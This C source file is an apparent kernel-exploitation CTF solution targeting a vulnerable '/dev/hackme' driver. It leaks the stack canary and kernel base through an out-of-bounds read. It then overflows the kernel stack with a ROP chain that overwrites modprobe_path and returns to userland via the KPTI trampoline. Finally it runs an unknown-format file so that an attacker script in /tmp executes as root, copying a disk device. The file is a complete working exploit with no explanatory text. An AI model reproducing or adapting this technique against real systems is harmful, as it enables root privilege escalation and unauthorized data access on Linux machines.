#include <fcntl.h>
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/xattr.h>
#include <unistd.h>

typedef unsigned long ul;

#define DEV_PATH "/dev/hackme"

int dev;

void bak() {
  __asm__ volatile(
      ".intel_syntax noprefix;"
      "mov bak_cs, cs;"
      "mov bak_ss, ss;"
      "mov bak_rsp, rsp;"
      "pushf;"
      "pop bak_rflags;"
      ".att_syntax;");
  puts("[+] Registers backed up");
}

/* Backup registers */
ul bak_cs, bak_rflags, bak_ss, bak_rsp;
ul cookie;

/* Helper functions */
void debug() {
  puts("[+] Halted execution");
  getchar();
}

void print_dump(ul* data, int len) {
  for (size_t i = 0; i < len; i++) {
    printf("%zu: 0x%lx\n", i, data[i]);
  }
}

void open_dev() {
  dev = open(DEV_PATH, O_RDWR);
  puts("[+] Interacting with device");
}

void err(const char* str) { fprintf(stderr, "[-] %s\n", str); }

#define CANARY_OFF 16
ul kernel_base;

ul modprobe_path = 0x1061820;
ul kpti_trampoline = 0x200f10 + 22;
ul pop_rbx_pop_r12 = 0x3190;
ul write_rax_in_rbx = 0x306d;
ul pop_rax = 0x4d11;          // pop rax ; ret

void leak() {
  ul buf[50];
  read(dev, buf, sizeof(buf));
  cookie = buf[CANARY_OFF];
  kernel_base = buf[38] - 0xa157;

  printf("[+] stack cookie: %p\n", (void*)cookie);
  printf("[+] kernel_base: %p\n", (void*)kernel_base);
  // print_dump(buf, sizeof(buf));
}

void win() {
  puts("[+] Win!");
  int fd = open("/tmp/x", O_RDWR | O_CREAT | O_TRUNC);
  char shellcode[] =
      "#!/bin/sh\n"
      "cp /dev/sda /tmp/flag\n"
      "chmod 777 /tmp/flag\n";
  write(fd, shellcode, sizeof(shellcode));
  fchmod(fd, 0755);
  close(fd);

  fd = open("/tmp/trigger", O_RDWR | O_CREAT | O_TRUNC);
  write(fd, "\xde\xad\xbe\xef", 4);
  fchmod(fd, 0755);
  close(fd);

  system("/tmp/trigger");
  system("cat /tmp/flag");
  exit(0);
}

void exploit() {
  ul payload[50];
  off_t offset = 16;
  payload[offset++] = cookie;
  payload[offset++] = 0x0;  // rbx
  payload[offset++] = 0x0;  // r12
  payload[offset++] = 0x0;  // rbp
  payload[offset++] = kernel_base + pop_rax;
  payload[offset++] = 0x782f706d742f;  // "/tmp/x"
  payload[offset++] = kernel_base + pop_rbx_pop_r12;
  payload[offset++] = kernel_base + modprobe_path;
  payload[offset++] = 0;  // dummy
  payload[offset++] = 0;  // dummy
  payload[offset++] = kernel_base + write_rax_in_rbx;
  payload[offset++] = 0;        // dummy
  payload[offset++] = 0;        // dummy
  payload[offset++] = kernel_base + (ul)kpti_trampoline;  // ret userland
  payload[offset++] = 0;        // dummy
  payload[offset++] = 0;        // dummy
  payload[offset++] = (ul)win;  // ret userland
  payload[offset++] = bak_cs;
  payload[offset++] = bak_rflags;
  payload[offset++] = bak_rsp;
  payload[offset++] = bak_ss;

  ssize_t w = write(dev, payload, sizeof(payload));
  if (w == -1) {
    perror("exploit");
  }
}

/* Exploit */
int main() {
  bak();

  open_dev();
  leak();
  exploit();
  return 0;
}